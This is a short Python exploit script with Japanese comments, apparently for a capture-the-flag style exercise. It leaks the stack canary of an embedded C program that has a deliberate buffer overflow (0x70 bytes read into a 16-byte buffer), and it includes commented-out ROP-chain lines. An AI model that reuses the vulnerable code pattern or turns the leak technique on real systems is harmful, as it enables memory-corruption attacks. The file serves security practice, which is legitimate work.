from ptrlib import *

# canaryのリーク
def canary_leak():

    pass


def main():
    """
```
<< EOF cat | gcc -static-pie -o hard -x c -
#include <stdio.h>
#include <unistd.h>

int main(void) {
    char msg[0x10] = {};

    setbuf(stdout, NULL);

    puts("You can put message 4 times");
    for (int i = 0; i < 4; i++) {
        printf("Input (%d/4) >> ", i + 1);
        read(STDIN_FILENO, msg, 0x70);
        printf("Output : %s\n", msg);
    }
    puts("Bye!");

    return 0;
}
// gcc hard.c -static-pie -o hard
EOF
```
    """
    elf = ELF("./hard")
    proc = Process("./hard")

    input()
    payload = b'p' * 0x10
    payload += b'p' * 8
    payload += b'p' # カナリー一歩手前
    #payload += p64(next(elf.gadget("pop rdi; ret")))
    #payload += p64(0xdeadbeef)
    #payload += p64(elf.symbol("win") + 5)
    proc.sendafter("Input (1/4) >> ", payload)
    proc.recv(len("Output : ") + len(payload)) # ゴミ
    leaked = proc.recv(7)
    leaked_canary = int.from_bytes(leaked, byteorder='little')
    print("leaked_canary", hex(leaked_canary))
    proc.interactive()

if __name__ == "__main__":
    main()
